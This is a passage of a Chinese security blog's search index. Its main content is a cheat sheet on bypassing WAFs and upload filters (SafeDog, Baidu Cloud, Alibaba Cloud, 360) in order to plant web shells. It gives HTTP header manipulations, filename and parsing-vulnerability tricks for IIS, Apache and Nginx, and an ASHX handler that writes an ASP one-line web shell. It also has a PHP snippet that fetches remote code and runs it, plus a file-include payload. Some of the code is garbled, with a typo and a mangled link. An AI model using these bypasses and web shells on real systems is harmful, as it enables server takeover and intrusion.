<li>Von Jens Müller, “CORS misconfigurations on a large scale”, <a href="https://github.com/RUB-NDS/CORStest" target="_blank" rel="noopener">CORStest</a>*</li>
</ul>
]]></content>
      <categories>
        <category>吃饭</category>
      </categories>
      <tags>
        <tag>渗透</tag>
        <tag>burp</tag>
      </tags>
  </entry>
  <entry>
    <title>WAF绕过安全狗绕过</title>
    <url>/2019/12/04/WAF%E7%BB%95%E8%BF%87%E5%AE%89%E5%85%A8%E7%8B%97%E7%BB%95%E8%BF%87/</url>
    <content><![CDATA[<h3 id="WAF绕过安全狗绕过"><a href="#WAF绕过安全狗绕过" class="headerlink" title="WAF绕过安全狗绕过"></a>WAF绕过安全狗绕过</h3><p><strong>1.绕过思路：对文件的内容，数据。数据包进行处理。</strong><br>关键点在这里Content-Disposition: form-data; name=”file”;<br>filename=”ian.php”将form-data;            修改为~form-data;</p>
<p><strong>2.通过替换大小写来进行绕过</strong><br>Content-Disposition: form-data; name=”file”; filename=”yjh.php”<br>Content-Type: application/octet-stream将Content-Disposition    修改为content-Disposition<br>将 form-data            修改为Form-data<br>将 Content-Type         修改为content-Type</p>
<p><strong>3.通过删减空格来进行绕过</strong><br>Content-Disposition: form-data; name=”file”; filename=”yjh.php”<br>Content-Type: application/octet-stream<br>将Content-Disposition: form-data          冒号后面 增加或减少一个空格<br>将form-data; name=”file”;                分号后面 增加或减少一个空格将<br>Content-Type: application/octet-stream   冒号后面 增加一个空格</p>
<p><strong>4.通过字符串拼接绕过看</strong><br>Content-Disposition: form-data; name=”file”; filename=”yjh3.php”<br>将 form-data 修改为   f+orm-data<br>将 from-data 修改为   form-d+ata</p>
<p><strong>5.双文件上传绕过</strong></p>
<form action="https://www.xxx.com/xxx.asp(php)" method="post"name="form1" enctype="multipart/form‐data">
<input name="FileName1" type="FILE" class="tx1" size="40">
<input name="FileName2" type="FILE" class="tx1" size="40">
<input type="submit" name="Submit" value="上传">
</form>

<p><strong>6.HTTP header 属性值绕过</strong><br>Content-Disposition: form-data; name=”file”; filename=”yjh.php”<br>我们通过替换form-data 为<em>来绕过<br>Content-Disposition: </em>; name=”file”; filename=”yjh.php”</p>
<p><strong>7.HTTP header 属性名称绕过</strong><br>源代码:<br>Content-Disposition: form-data; name=”image”; filename=”085733uykwusqcs8vw8wky.png”Content-Type: image/png<br>绕过内容如下：<br>Content-Disposition: form-data; name=”image”; filename=”085733uykwusqcs8vw8wky.pngC.php”<br>删除掉ontent-Type: image/jpeg只留下c，将.php加c后面即可，但是要注意额，双引号要跟着c.php”.</p>
<p><strong>8.等效替换绕过原内容：</strong><br>Content-Type: multipart/form-data; boundary=—————————————-471463142114<br>修改后:<br>Content-Type: multipart/form-data; boundary =—————————————-471463142114<br>boundary后面加入空格。<br><strong>9.修改编码绕过使用</strong><br>UTF-16、Unicode、双URL编码等等<br><strong>WTS-WAF 绕过上传</strong><br>原内容：<br>Content-Disposition: form-data; name=”up_picture”; filename=”xss.php”<br>添加回车<br>Content-Disposition: form-data; name=”up_picture”; filename=”xss.php”</p>
<p><strong>百度云上传绕过</strong><br>百度云绕过就简单的很多很多，在对文件名大小写上面没有检测php是过了的，Php就能过，或者PHP，一句话自己合成图片马用Xise连接即可。<br>Content-Disposition: form-data; name=”up_picture”; filename=”xss.jpg .Php”</p>
<p><strong>阿里云上传绕过源代码：</strong><br>Content-Disposition: form-data; name=”img_crop_file”; filename=”1.jpg .Php”Content-Type: image/jpeg</p>
<p>修改如下：<br>Content-Disposition: form-data; name=”img_crop_file”; filename=”1.php”</p>
<p>没错，将=号这里回车删除掉Content-Type: image/jpeg即可绕过。</p>
<p><strong>360主机上传绕过</strong><br>源代码:<br>Content-Disposition: form-data; name=”image”; filename=”085733uykwusqcs8vw8wky.png”Content-Type: image/png<br>绕过内容如下：<br>Content- Disposition: form-data; name=”image”; filename=”085733uykwusqcs8vw8wky.png<br>Content-Disposition 修改为 Content-空格Disposition</p>
<p><strong>MIME类型绕过</strong><br>上传木马时，提示格式错误。直接抓包修改Content-Type 为正确的格式尝试绕过</p>
<p><strong>文件内容检测绕过</strong><br>抓包，在正常图片末尾添加一句话木马</p>
<p><strong>多次上传Win特性绕过</strong><br>多次上传同一个文件，windows会自动更新补全TEST (1).php。有时会触发条件竞争，导致绕过。</p>
<p><strong>条件竞争绕过</strong><br>通过BURP不断发包，导致不断写入Webshell，再写入速度频率上超过安全软件查杀频率，导致绕过。<strong>CONTENT-LENGTH绕过</strong><br>针对这种类型的验证，我们可以通过上传一些非常短的恶意代码来绕过。上传文件的大小取决于，Web服务器上的最大长度限制。我们可以使用不同大小的文件来fuzzing上传程序，从而计算出它的限制范围。</p>
<p><strong>文件内容检测绕过</strong><br>针对文件内容检测的绕过，一般有两种方式，<br>1.制作图片马<br>2.文件幻术头绕过</p>
<p><strong>垃圾数据填充绕过</strong><br>修改HTTP请求，再之中加入大量垃圾数据。</p>
<h3 id="黑名单后缀绕过"><a href="#黑名单后缀绕过" class="headerlink" title="黑名单后缀绕过"></a>黑名单后缀绕过</h3><p><strong>文件扩展名绕过</strong><br>Php除了可以解析php后缀 还可以解析php2.php3，php4 后缀</p>
<p><strong>ashx上传绕过</strong><br>cer,asa,cdx等等无法使用时候。<br>解析后就会生成一个test.asp的马，你就可以连接这个test.asp  密码为:put<br><code>&lt;%@ WebHandler Language=&quot;C#&quot; Class=&quot;Handler&quot; %&gt;
using System;
using System.Web;
using System.IO;
public class Handler : IHttpHandler {    
         public void ProcessRequest (HttpContext context) {        
                 context.Response.ContentType = &quot;text/plain&quot;;      
                 //这里会在目录下生成一个test.asp的文件       
                 StreamWriter file1= File.CreateText(context.Server.MapPath(&quot;test.asp&quot;));       
                 //这里是写入一句话木马   密码是：ptu        
                 ile1.Write(&quot;&lt;%response.clear:execute request(&quot;put&quot;):response.End%&gt;&quot;);          
                 file1.Flush();       
                 file1.Close();    }   
          public bool IsReusable {        
                 get {          
                     return false;       
                       }
           }
 }</code><br><strong>特殊文件名绕过</strong><br>比如发送的 http包里把文件名改成 test.asp. 或 test.asp_(下划线为空格)，这种命名方式在windows系统里是不被允许的，所以需要在 burp之类里进行修改，然后绕过验证后，会被windows系统自动去掉后面的点和空格，但要注意Unix/Linux系统没有这个特性。</p>
<p><strong>Windows流特性绕过</strong><br>php在windows的时候如果文件名+”::$DATA”会把::$DATA之后的数据当成文件流处理,不会检测后缀名.且保持”::$DATA”之前的文件名。</p>
<h3 id="白名单后缀绕过"><a href="#白名单后缀绕过" class="headerlink" title="白名单后缀绕过"></a>白名单后缀绕过</h3><p><strong>00截断绕过上传</strong><br>php .jpg   空格二进制20改为00IIS 6.0 目录路径检测解析绕过上传路径改为XXX/1.asp/htaccess解析漏洞上传的jpg文件都会以php格式解析.htaccess内容：AddType    application/x-httpd-php    .jpg突破MIME限制上传方法：找一个正常的可上传的查看其的MIME类型，然后将马子的MIME改成合法的MIME即可。Apache解析漏洞1.一个文件名为test.x1.x2.x3的文件，apache会从x3的位置开始尝试解析，如果x3不属于apache能够解析的扩展名，那么apache会尝试去解析x2，直到能够解析到能够解析的为止，否则就会报错。2.CVE-2017-15715，这个漏洞利用方式就是上传一个文件名最后带有换行符(只能是\x0A，如上传a.php，然后在burp中修改文件名为a.php\x0A)，以此来绕过一些黑名单过滤。IIS解析漏洞IIS6.0在解析asp格式的时候有两个解析漏洞，一个是如果目录名包含”.asp”字符串，那么这个目录下所有的文件都会按照asp去解析，另一个是只要文件名中含有”.asp;”会优先按asp来解析IIS7.0/7.5是对php解析时有一个类似于Nginx的解析漏洞，对任意文件名只要在URL后面追加上字符串”/任意文件名.php”就会按照php的方式去解析；Nginx解析漏洞解析：(任意文件名)/(任意文件名).php | (任意文件名)%00.php描述：目前Nginx主要有这两种漏洞，一个是对任意文件名，在后面添加/任意文件名.php的解析漏洞，比如原本文件名是test.jpg，可以添加为test.jpg/x.php进行解析攻击。还有一种是对低版本的Nginx可以在任意文件名后面添加%00.php进行解析攻击。解析漏洞Content-Disposition: form-data; name=”file”;  filename=php.php;.jpg前端限制绕过1.使用BURP抓包修改后重放2.或者使用浏览器中元素审查，修改允许或禁止上传文件类型。下载绕过远程下载文件绕过&lt;?php$str = file_get_contents(‘<a href="http://127.0.0.1/ian.txt&#39;);$str($_post[&#39;ian&#39;]);?&gt;文件包含绕过上传图片木马$x=$_GET[&#39;x&#39;];include($x);访问:http://www.xxxx.com/news.php?x=xxxxxx.jpg" target="_blank" rel="noopener">http://127.0.0.1/ian.txt&#39;);$str($_post[&#39;ian&#39;]);?&gt;文件包含绕过上传图片木马$x=$_GET[&#39;x&#39;];include($x);访问:http://www.xxxx.com/news.php?x=xxxxxx.jpg</a></p>
]]></content>
      <categories>
        <category>渗透</category>
      </categories>
      <tags>
        <tag>安全狗</tag>
        <tag>WAF</tag>
      </tags>
  </entry>
  <entry>
    <title>hello-world</title>
    <url>/2019/12/04/hello-world/</url>
    <content><![CDATA[]]></content>
  </entry>
</search>
